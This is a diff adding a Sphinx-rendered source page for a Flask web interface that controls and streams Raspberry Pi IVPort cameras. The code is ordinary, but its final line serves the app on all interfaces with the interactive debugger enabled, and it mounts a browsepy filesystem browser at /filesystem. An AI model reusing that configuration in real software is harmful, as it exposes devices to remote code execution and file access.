+    <span class="n">IVPortCamera</span><span class="o">.</span><span class="n">switch</span><span class="p">(</span><span class="n">idx</span><span class="o">=</span><span class="n">cam_num</span><span class="p">)</span>
+    <span class="k">return</span> <span class="nb">str</span><span class="p">(</span><span class="n">cam_num</span><span class="p">)</span></div>
+
+
+<span class="nd">@app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s1">&#39;/ivport_feed/&lt;int:cam_num&gt;&#39;</span><span class="p">)</span>
+<div class="viewcode-block" id="ivport_feed"><a class="viewcode-back" href="../webinterface.html#webinterface.ivport_feed">[docs]</a><span class="k">def</span> <span class="nf">ivport_feed</span><span class="p">(</span><span class="n">cam_num</span><span class="p">):</span>
+    <span class="sd">&quot;&quot;&quot;</span>
+<span class="sd">    stream from a specificcamera</span>
+<span class="sd">    :param cam_num:</span>
+<span class="sd">    :return:</span>
+<span class="sd">    &quot;&quot;&quot;</span>
+    <span class="n">IVPortCamera</span><span class="o">.</span><span class="n">switch</span><span class="p">(</span><span class="n">idx</span><span class="o">=</span><span class="n">cam_num</span><span class="p">)</span>
+    <span class="k">return</span> <span class="n">pi_feed</span><span class="p">()</span></div>
+
+
+<span class="nd">@app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s2">&quot;/logfile&quot;</span><span class="p">)</span>
+<span class="nd">@requires_auth</span>
+<div class="viewcode-block" id="logfile"><a class="viewcode-back" href="../webinterface.html#webinterface.logfile">[docs]</a><span class="k">def</span> <span class="nf">logfile</span><span class="p">():</span>
+    <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s2">&quot;logpage.html&quot;</span><span class="p">)</span></div>
+
+
+<span class="nd">@app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s2">&quot;/&lt;any(&#39;css&#39;,&#39;js&#39;):selector&gt;/&lt;path:path&gt;&quot;</span><span class="p">)</span>
+<span class="nd">@requires_auth</span>
+<div class="viewcode-block" id="get_resource"><a class="viewcode-back" href="../webinterface.html#webinterface.get_resource">[docs]</a><span class="k">def</span> <span class="nf">get_resource</span><span class="p">(</span><span class="n">selector</span><span class="p">,</span> <span class="n">path</span><span class="p">):</span>
+    <span class="k">return</span> <span class="n">send_from_directory</span><span class="p">(</span><span class="s2">&quot;static&quot;</span><span class="p">,</span> <span class="n">filename</span><span class="o">=</span><span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">selector</span><span class="p">,</span> <span class="n">path</span><span class="p">))</span></div>
+
+
+<span class="k">if</span> <span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s2">&quot;ping -c 1 8.8.8.8&quot;</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">:</span>
+    <span class="n">setup_ap</span><span class="p">()</span>
+
+
+    <span class="k">def</span> <span class="nf">cleanup</span><span class="p">():</span>
+        <span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s2">&quot;systemctl stop create_ap.service&quot;</span><span class="p">)</span>
+        <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;create_ap stopped gracefully&quot;</span><span class="p">)</span>
+
+
+    <span class="kn">import</span> <span class="nn">atexit</span>
+
+    <span class="n">atexit</span><span class="o">.</span><span class="n">register</span><span class="p">(</span><span class="n">cleanup</span><span class="p">)</span>
+
+<span class="n">application</span> <span class="o">=</span> <span class="n">DispatcherMiddleware</span><span class="p">(</span><span class="n">app</span><span class="p">,</span> <span class="n">mounts</span><span class="o">=</span><span class="p">{</span>
+    <span class="s2">&quot;/filesystem&quot;</span><span class="p">:</span> <span class="n">browsepy</span><span class="o">.</span><span class="n">app</span>
+<span class="p">})</span>
+
+<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s2">&quot;__main__&quot;</span><span class="p">:</span>
+    <span class="n">run_simple</span><span class="p">(</span><span class="s2">&quot;0.0.0.0&quot;</span><span class="p">,</span> <span class="mi">80</span><span class="p">,</span> <span class="n">application</span><span class="p">,</span> <span class="n">use_debugger</span><span class="o">=</span><span class="kc">True</span><span class="p">,</span> <span class="n">use_reloader</span><span class="o">=</span><span class="kc">True</span><span class="p">,</span> <span class="n">threaded</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
+</pre></div>
+
+          </div>
+        </div>
+      </div>
+      <div class="sphinxsidebar" role="navigation" aria-label="main navigation">
+        <div class="sphinxsidebarwrapper"><div class="relations">
+<h3>Related Topics</h3>
+<ul>
+  <li><a href="../index.html">Documentation overview</a><ul>
+  <li><a href="index.html">Module code</a><ul>
+  </ul></li>
+  </ul></li>
+</ul>
+</div>
+<div id="searchbox" style="display: none" role="search">
+  <h3>Quick search</h3>
+    <form class="search" action="../search.html" method="get">
+      <div><input type="text" name="q" /></div>
+      <div><input type="submit" value="Go" /></div>
+      <input type="hidden" name="check_keywords" value="yes" />
+      <input type="hidden" name="area" value="default" />
+    </form>
+</div>
+<script type="text/javascript">$('#searchbox').show(0);</script>
+        </div>
+      </div>
+      <div class="clearer"></div>
+    </div>
+    <div class="footer">
+      &copy;2016, Gareth Dunstone, Kevin Murray, Tim Brown.
+      
+      |
+      Powered by <a href="http://sphinx-doc.org/">Sphinx 1.5</a>
+      &amp; <a href="https://github.com/bitprophet/alabaster">Alabaster 0.7.9</a>
+      
+    </div>
+
+    
+
+    
+  </body>
+</html>
